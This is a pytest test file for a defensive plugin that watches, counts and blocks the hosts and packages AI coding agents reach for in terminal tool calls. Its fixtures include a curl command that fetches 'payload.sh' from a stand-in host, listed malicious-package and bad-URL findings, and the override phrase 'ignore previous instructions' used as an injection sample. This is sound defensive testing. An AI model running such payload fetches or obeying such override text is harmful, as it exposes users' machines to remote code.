"""Watch rules: watch a host or package first, count how often agents reach for it, then block it.

Contracts (2026-11-24): a rule starts in watch, and a call that names it (a host or its subdomain,
a package an install command names) is flagged and counted per rule and agent but never refused, in
any mode; promoted to enforce, the same call is refused in Block mode; the rule keeps its id and its
hits across the move; taking an enforced rule off or back to watch is a weakening change (the
approval gate asks), adding or promoting is not; an organisation's rules only watch, can not be
promoted here, and an older set can not replace a newer one; a rule is suggested from a finding
(the package or host it names); a watch finding is never shared outside the machine.
"""

from __future__ import annotations

import pytest

from plugins.blackbox import guard, watch
from plugins.blackbox.community.sharing import NEVER_SHARED_SOURCES

INSTALL = {"command": "npm install left-pad@1.3.0"}
FETCH = {"command": "curl -sL https://cdn.files.example.top/payload.sh"}


@pytest.fixture(autouse=True)
def _home(tmp_path, monkeypatch):
    monkeypatch.setenv("BLACKBOX_HOME", str(tmp_path / "blackbox"))
    monkeypatch.setenv("HERMES_HOME", str(tmp_path / "hermes"))
    (tmp_path / "hermes").mkdir()


def _block_mode(on: bool) -> None:
    from plugins.blackbox.kernel import settings
    assert settings.write_settings({"mode": "block" if on else "audit"})["ok"]


def _rule(value: str) -> watch.RuleView:
    return next(r for r in watch.view() if r["value"] == value)


def test_a_watched_host_or_package_is_flagged_and_counted_and_never_refused():
    _block_mode(True)
    assert watch.add("host", "Files.Example.Top")["ok"] and watch.add("package", "npm:left-pad")["ok"]
    for args in (FETCH, INSTALL):
        verdict = guard.tool_call_verdict("terminal", args, agent="codex")
        assert verdict["decision"] != "block"
        assert any(f["identifier"].startswith("watch:") for f in verdict["findings"])
    assert _rule("files.example.top")["hits"] == 1 and _rule("npm:left-pad")["last_agent"] == "codex"
    assert "custom" in NEVER_SHARED_SOURCES   # a watch finding is the person's own rule: never shared


def test_a_promoted_rule_blocks_and_keeps_its_id_and_hits():
    _block_mode(True)
    watch.add("package", "npm:left-pad")
    guard.tool_call_verdict("terminal", INSTALL)
    before = _rule("npm:left-pad")
    assert watch.promote(before["rule_id"])["ok"]
    verdict = guard.tool_call_verdict("terminal", INSTALL)
    assert verdict["decision"] == "block" and f"watch:{before['rule_id']}" in verdict["blocked"]
    after = _rule("npm:left-pad")
    assert after["state"] == "enforce" and after["rule_id"] == before["rule_id"] and after["hits"] == 2


def test_only_taking_an_enforced_rule_off_or_back_to_watch_turns_protection_down():
    watch.add("host", "a.example.top")
    watch.add("host", "b.example.top")
    watch.promote(_rule("a.example.top")["rule_id"])
    assert watch.weakening({"rules": [{"kind": "host", "value": "a.example.top", "state": "enforce"}]}) == []
    assert watch.weakening({"rules": [{"kind": "host", "value": "a.example.top", "state": "watch"}]})
    assert watch.weakening({"rules": []}) == ["Stop blocking a.example.top (your watch rule)"]


def test_an_organisations_rules_only_watch_and_an_older_set_is_refused():
    _block_mode(True)
    watch.set_organisation_rules(2, [{"kind": "host", "value": "files.example.top", "state": "enforce"}])
    verdict = guard.tool_call_verdict("terminal", FETCH)
    assert verdict["decision"] != "block" and _rule("files.example.top")["origin"] == "organisation"
    assert not watch.promote(_rule("files.example.top")["rule_id"])["ok"]
    with pytest.raises(ValueError):
        watch.set_organisation_rules(1, [])
    assert watch.set_organisation_rules(0, []) == () and watch.view() == []


def test_a_rule_is_suggested_from_a_finding():
    package = {"identifier": "dependency:npm:left-pad", "title": "Malicious package left-pad",
               "matched": "npm:left-pad@1.3.0", "fields": {"ecosystem": "npm", "package_name": "left-pad"}}
    host = {"identifier": "ioc:url", "title": "Known-bad url", "matched": "https://cdn.files.example.top/x"}
    assert watch.suggest(package)["value"] == "npm:left-pad"
    assert watch.suggest(host) == {"kind": "host", "value": "cdn.files.example.top", "note": "from a finding: Known-bad url"}
    assert watch.suggest({"identifier": "injection:x", "matched": "ignore previous instructions"}) is None


def test_a_rule_is_suggested_from_a_real_findings_feed_row():
    """KI-694 / KI-702: the dashboard's "Watch this" link posts a row of ``GET /api/findings``, which
    keeps the identifier but not ``matched`` or ``fields``. Rows recorded and read back exactly as the
    feed serves them (the two real shapes the test rounds saw) still give a suggestion."""
    from plugins.blackbox import audit
    audit.record(event="pre_tool_call", findings=[
        {"identifier": "ioc:domain:0652886581.xyz", "category": "ioc", "severity": "high",
         "title": "Listed domain", "evidence": "domain 0652886581.xyz"},
        {"identifier": "dep:pypi:six@1.17.0-r5test", "category": "dependency", "severity": "critical",
         "title": "Malicious package six", "evidence": "pypi:six@1.17.0 in uv.lock"},
        {"identifier": "ioc:url:https://dl.x.top/a.sh", "category": "ioc", "severity": "high", "title": "Listed URL"}],
        detail={"decision": "flag"})
    rows = {row["identifier"]: row for row in audit.read_findings()}
    assert not rows["ioc:domain:0652886581.xyz"].get("matched")   # the feed's shape, as the rounds saw it
    assert watch.suggest(rows["ioc:domain:0652886581.xyz"])["value"] == "0652886581.xyz"
    assert watch.suggest(rows["dep:pypi:six@1.17.0-r5test"]) == {
        "kind": "package", "value": "pypi:six", "note": "from a finding: Malicious package six"}
    assert watch.suggest(rows["ioc:url:https://dl.x.top/a.sh"])["value"] == "dl.x.top"


def test_a_watch_rules_own_finding_suggests_nothing():
    """A watch rule's own finding names a rule that already exists: no second suggestion."""
    assert watch.add("host", "files.example.top")["ok"]
    found = watch.check("terminal", {"command": "curl https://files.example.top/x"})
    assert found and watch.suggest(found[0].to_dict()) is None


def test_a_blocking_watch_rule_is_named_as_the_persons_rule_not_self_protection():
    """KI-696: the refusal said "refused by Blackbox's self-protection" for the person's own rule."""
    from plugins.blackbox.guard import reporting
    assert watch.add("host", "files.example.top")["ok"]
    assert watch.promote(_rule("files.example.top")["rule_id"])["ok"]
    found = watch.check("terminal", {"command": "curl https://files.example.top/x"})
    text = reporting.blackbox_block_message(found)
    assert "it was refused by your watch rule" in text and "self-protection" not in text
